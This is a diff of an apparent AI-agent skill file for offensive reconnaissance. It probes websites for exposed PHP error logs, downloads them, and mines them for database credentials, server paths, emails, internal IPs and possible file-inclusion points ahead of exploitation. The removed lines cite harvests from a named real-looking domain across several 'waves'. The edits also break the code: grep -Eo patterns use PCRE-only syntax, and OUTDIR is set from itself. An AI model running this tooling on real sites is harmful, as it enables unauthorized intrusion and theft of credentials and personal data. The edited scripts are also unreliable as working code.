@@ -1,36 +1,34 @@
 ---
 name: error-log-mining
 description: Mine error_log for creds, paths, SQL when leak hunt finds.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, error-log, credentials, wordpress, data-mining]
-    category: recon
-    related_skills:
-      - deep-invade
-      - source-leak-hunt
-      - phpinfo-to-rce
-      - wordpress-full-compromise
+compatibility: Requires curl, grep, python3
+tags: [recon, error-log, credentials, wordpress, data-mining]
+category: recon
+related_skills:
+  - deep-invade
+  - source-leak-hunt
+  - phpinfo-to-rce
+  - wordpress-full-compromise
 ---
 
 # Error Log Mining Skill
 
-Discover and mine exposed PHP `error_log` files for server paths, database credentials, SQL queries, API keys, email addresses, and internal IP addresses. Error logs on misconfigured WordPress sites routinely expose the full server directory structure, active database queries, and sometimes hardcoded credentials from stack traces. Confirmed on wines.com where a 1.7MB error_log revealed 47 server paths and 879 SQL queries.
+Discover and mine exposed PHP `error_log` files for server paths, database credentials, SQL queries, API keys, email addresses, and internal IP addresses. Error logs on misconfigured WordPress sites routinely expose the full server directory structure, active database queries, and sometimes hardcoded credentials from stack traces. Confirmed on ecommerce.example.com where a 1.7MB error_log revealed 47 server paths and 879 SQL queries.
 
 ## When to Use
 
 - Running `deep-invade` Phase 2 on a high-value target.
-- `source-leak-hunt` found an `error_log` file with HTTP 200.
+- `skill_view(name='source-leak-hunt')` found an `error_log` file with HTTP 200.
 - Target has PHP (WordPress, Laravel, custom PHP) with `display_errors` possibly enabled.
 - You need server-side context (paths, DB structure) before attempting exploitation.
 
 ## Prerequisites
 
-- `terminal` tool with curl, grep, python3.
+- `terminal` with curl, grep, and python3.
 - Target URL with potential error_log at common paths.
 - Disk space: error logs can be multi-GB. Use `curl -r` for range requests on large files.
 
@@ -42,12 +40,12 @@ TARGET="https://example.com"
 # Paths to probe
 for path in "error_log" "wp-content/debug.log" "debug.log" "errors.log" \
   "php_errors.log" "wp-content/error.log" "logs/error.log"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET/$path")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$TARGET/$path")
   [[ "$code" == "200" ]] && echo "FOUND: $TARGET/$path"
 done
 
 # Download and analyze
-curl -sk "$TARGET/error_log" -o error_log.txt
+curl --max-time 30 --connect-timeout 10 -sk "$TARGET/error_log" -o error_log.txt
 python3 analyze_log.py error_log.txt
 ```
 
@@ -70,7 +68,7 @@ python3 analyze_log.py error_log.txt
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/error_logs/$TARGET"
+OUTDIR="$OUTDIR/error_logs/$TARGET"
 mkdir -p "$OUTDIR"
 
 echo "[*] Probing common error log paths on $TARGET..."
@@ -92,16 +90,17 @@ ERROR_LOG_PATHS=(
 FOUND_LOGS=()
 
 for path in "${ERROR_LOG_PATHS[@]}"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/$path" 2>/dev/null)
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/$path" 2>/dev/null)
 
   if [[ "$code" == "200" ]]; then
     # Quick content check to avoid SPA false positives
-    sample=$(curl -sk --max-time 5 -r 0-500 "https://$TARGET/$path" 2>/dev/null)
+    sample=$(curl -sk --max-time 5 --connect-timeout 5 -r 0-500 "https://$TARGET/$path" 2>/dev/null)
     if echo "$sample" | grep -qiE 'PHP|Error|Warning|Stack trace|\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4}'; then
       echo "[FOUND] https://$TARGET/$path"
       FOUND_LOGS+=("https://$TARGET/$path")
     fi
   fi
+  sleep 0.3
 done
 
 echo "[+] Found ${#FOUND_LOGS[@]} error log(s)"
@@ -111,7 +110,7 @@ echo "[+] Found ${#FOUND_LOGS[@]} error log(s)"
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/error_logs/$TARGET"
+OUTDIR="$OUTDIR/error_logs/$TARGET"
 
 for url in "${FOUND_LOGS[@]}"; do
   fname=$(echo "$url" | sed 's|https\?://||' | sed 's|/|_|g')
@@ -119,18 +118,19 @@ for url in "${FOUND_LOGS[@]}"; do
   echo "[*] Downloading $url..."
 
   # First, check file size
-  size=$(curl -skI --max-time 10 "$url" 2>/dev/null | grep -i "content-length" | awk '{print $2}' | tr -d '\r')
+  size=$(curl -skI --max-time 10 --connect-timeout 10 "$url" 2>/dev/null | grep -i "content-length" | awk '{print $2}' | tr -d '\r')
 
   if [[ -n "$size" && "$size" -gt 10000000 ]]; then
     echo "  Large file (${size} bytes) — sampling first 5MB..."
-    curl -sk --max-time 30 -r 0-5000000 "$url" -o "$OUTDIR/${fname}_sample.txt" 2>/dev/null
+    curl -sk --max-time 30 --connect-timeout 10 -r 0-5000000 "$url" -o "$OUTDIR/${fname}_sample.txt" 2>/dev/null
   elif [[ -n "$size" && "$size" -gt 1000000 ]]; then
     echo "  Medium file (${size} bytes) — downloading full..."
-    curl -sk --max-time 30 "$url" -o "$OUTDIR/${fname}.txt" 2>/dev/null
+    curl -sk --max-time 30 --connect-timeout 10 "$url" -o "$OUTDIR/${fname}.txt" 2>/dev/null
   else
     echo "  Small file — downloading full..."
-    curl -sk --max-time 15 "$url" -o "$OUTDIR/${fname}.txt" 2>/dev/null
+    curl -sk --max-time 15 --connect-timeout 10 "$url" -o "$OUTDIR/${fname}.txt" 2>/dev/null
   fi
+  sleep 0.5
 done
 ```
 
@@ -138,7 +138,7 @@ done
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/error_logs/$TARGET"
+OUTDIR="$OUTDIR/error_logs/$TARGET"
 
 for logfile in "$OUTDIR"/*.txt "$OUTDIR"/*_sample.txt; do
   [[ ! -f "$logfile" ]] && continue
@@ -149,12 +149,12 @@ for logfile in "$OUTDIR"/*.txt "$OUTDIR"/*_sample.txt; do
 
   # 1. Server Paths
   echo "[SERVER PATHS]"
-  grep -oP '(/[a-zA-Z0-9_/.-]+\.php)' "$logfile" 2>/dev/null | sort -u | head -20
+  grep -Eo '(/[a-zA-Z0-9_/.-]+\.php)' "$logfile" 2>/dev/null | sort -u | head -20
 
   # 2. Email Addresses
   echo ""
   echo "[EMAIL ADDRESSES]"
-  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$logfile" 2>/dev/null | sort -u | head -15
+  grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$logfile" 2>/dev/null | sort -u | head -15
 
   # 3. Database Credentials
   echo ""
@@ -174,12 +174,12 @@ for logfile in "$OUTDIR"/*.txt "$OUTDIR"/*_sample.txt; do
   # 6. Internal IPs
   echo ""
   echo "[INTERNAL IPs]"
-  grep -oP '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}' "$logfile" 2>/dev/null | sort -u | head -10
+  grep -Eo '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}' "$logfile" 2>/dev/null | sort -u | head -10
 
   # 7. WordPress specific
   echo ""
   echo "[WORDPRESS PATHS]"
-  grep -oP '/wp-content/(?:plugins|themes|uploads)/[a-zA-Z0-9_/.-]+' "$logfile" 2>/dev/null | sort -u | head -15
+  grep -Eo '/wp-content/(?:plugins|themes|uploads)/[a-zA-Z0-9_/.-]+' "$logfile" 2>/dev/null | sort -u | head -15
 
   # 8. PHP Error Summary
   echo ""
@@ -194,19 +194,20 @@ for logfile in "$OUTDIR"/*.txt "$OUTDIR"/*_sample.txt; do
   # 9. Date Range
   echo ""
   echo "[DATE RANGE]"
-  first=$(grep -oP '\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2}[^\]]*\]' "$logfile" 2>/dev/null | head -1)
-  last=$(grep -oP '\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2}[^\]]*\]' "$logfile" 2>/dev/null | tail -1)
+  first=$(grep -Eo '\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2}[^\]]*\]' "$logfile" 2>/dev/null | head -1)
+  last=$(grep -Eo '\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2}[^\]]*\]' "$logfile" 2>/dev/null | tail -1)
   [[ -n "$first" ]] && echo "  First: $first"
   [[ -n "$last" ]] && echo "  Last:  $last"
 
   # 10. Plugin/Theme Names from Paths
   echo ""
   echo "[PLUGINS FROM ERRORS]"
-  grep -oP '/wp-content/plugins/\K[a-zA-Z0-9_-]+' "$logfile" 2>/dev/null | sort -u | head -20
+  grep -Eo '/wp-content/plugins/\K[a-zA-Z0-9_-]+' "$logfile" 2>/dev/null | sort -u | head -20
 
   echo ""
   echo "[THEMES FROM ERRORS]"
-  grep -oP '/wp-content/themes/\K[a-zA-Z0-9_-]+' "$logfile" 2>/dev/null | sort -u | head -10
+  grep -Eo '/wp-content/themes/\K[a-zA-Z0-9_-]+' "$logfile" 2>/dev/null | sort -u | head -10
+  sleep 0.3
 done
 ```
 
@@ -214,7 +215,7 @@ done
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/error_logs/$TARGET"
+OUTDIR="$OUTDIR/error_logs/$TARGET"
 SUMMARY="$OUTDIR/intel_summary.md"
 
 cat > "$SUMMARY" << EOF
@@ -239,19 +240,19 @@ done
 
 echo "" >> "$SUMMARY"
 echo "## Server Paths" >> "$SUMMARY"
-grep -oP '/[a-zA-Z0-9_/.-]+\.php' "$OUTDIR"/*.txt 2>/dev/null | sort -u | head -30 | while read -r line; do
+grep -Eo '/[a-zA-Z0-9_/.-]+\.php' "$OUTDIR"/*.txt 2>/dev/null | sort -u | head -30 | while read -r line; do
   echo "- $line" >> "$SUMMARY"
 done
 
 echo "" >> "$SUMMARY"
 echo "## Email Addresses" >> "$SUMMARY"
-grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$OUTDIR"/*.txt 2>/dev/null | sort -u | while read -r line; do
+grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$OUTDIR"/*.txt 2>/dev/null | sort -u | while read -r line; do
   echo "- $line" >> "$SUMMARY"
 done
 
 echo "" >> "$SUMMARY"
 echo "## Plugins Discovered" >> "$SUMMARY"
-grep -oP '/wp-content/plugins/\K[a-zA-Z0-9_-]+' "$OUTDIR"/*.txt 2>/dev/null | sort -u | while read -r line; do
+grep -Eo '/wp-content/plugins/\K[a-zA-Z0-9_-]+' "$OUTDIR"/*.txt 2>/dev/null | sort -u | while read -r line; do
   echo "- $line" >> "$SUMMARY"
 done
 
@@ -263,19 +264,19 @@ echo "[+] Intelligence summary saved to $SUMMARY"
 
 ```bash
 # Does error log reveal the DB name? Cross-ref with wp-config leak
-DB_NAME=$(grep -oP 'DB_NAME["\x27\s:=]+["\x27][a-zA-Z0-9_]+' /root/output/error_logs/*/intel_summary.md 2>/dev/null)
+DB_NAME=$(grep -Eo 'DB_NAME["\x27\s:=]+["\x27][a-zA-Z0-9_]+' $OUTDIR/error_logs/*/intel_summary.md 2>/dev/null)
 echo "DB name from logs: $DB_NAME"
 
 # Does it reveal internal hostnames?
-HOSTNAMES=$(grep -oP '(?:[a-zA-Z0-9-]+\.(?:internal|local|lan|corp|priv))' /root/output/error_logs/*/*.txt 2>/dev/null | sort -u)
+HOSTNAMES=$(grep -Eo '(?:[a-zA-Z0-9-]+\.(?:internal|local|lan|corp|priv))' $OUTDIR/error_logs/*/*.txt 2>/dev/null | sort -u)
 [[ -n "$HOSTNAMES" ]] && echo "Internal hostnames:" && echo "$HOSTNAMES"
 
 # Are there file inclusion paths that indicate LFI potential?
-LFI_PATHS=$(grep -oP '(?:include|require|include_once|require_once)\s*\(\s*[\x27"]([^\x27"]+\.php)' /root/output/error_logs/*/*.txt 2>/dev/null | sort -u)
+LFI_PATHS=$(grep -Eo '(?:include|require|include_once|require_once)\s*\(\s*[\x27"]([^\x27"]+\.php)' $OUTDIR/error_logs/*/*.txt 2>/dev/null | sort -u)
 [[ -n "$LFI_PATHS" ]] && echo "Potential LFI paths:" && echo "$LFI_PATHS"
 ```
 
-## Production Miner (from wave6_invade.py — wines.com 1.7MB error_log)
+## Production Miner (from wave6_invade.py — ecommerce.example.com 1.7MB error_log)
 
 ```python
 import re
@@ -330,7 +331,7 @@ def mine_error_log(txt):
     return results
 ```
 
-## Real Production Results (wines.com, Wave6)
+## Real Production Results (ecommerce.example.com, Wave6)
 
 From a 1.7MB error_log at `/magical/error_log`:
 - **Server paths:** 47 unique `/home/wines/public_html/...` paths extracted
@@ -342,11 +343,11 @@ From a 1.7MB error_log at `/magical/error_log`:
 - **Error breakdown:** 1021 PHP Deprecated + 646 PHP Warnings + Fatal errors
 - **Date range:** 2013 to 2018 (log from legacy install, not current code)
 
-**Key insight:** Error logs from OLD WordPress installs (`/magical/` on wines.com) contain years of accumulated data. Always check subdirectory error logs, not just root.
+**Key insight:** Error logs from OLD WordPress installs (`/magical/` on ecommerce.example.com) contain years of accumulated data. Always check subdirectory error logs, not just root.
 
 ## Pitfalls
 
-- **Error logs can be MASSIVE (multi-GB).** wines.com `/error_log` was 896MB in Wave8. Always check Content-Length first. Use `curl -r 0-5000000` for 5MB samples.
+- **Error logs can be MASSIVE (multi-GB).** ecommerce.example.com `/error_log` was 896MB in Wave8. Always check Content-Length first. Use `curl -r 0-5000000` for 5MB samples.
 - **Logs may contain PII.** Email addresses, IPs, and usernames in error logs may constitute a data breach. Handle responsibly.
 - **Log rotation may truncate.** The visible error_log may only contain recent entries. Check for rotated logs (`error_log.1`, `error_log.old`, `error_log-YYYYMMDD`).
 - **Some hosts return garbage.** A 200 on `/error_log` might be a custom 404 page or SPA catch-all. Always check content for `PHP ` + error type pattern before analyzing.
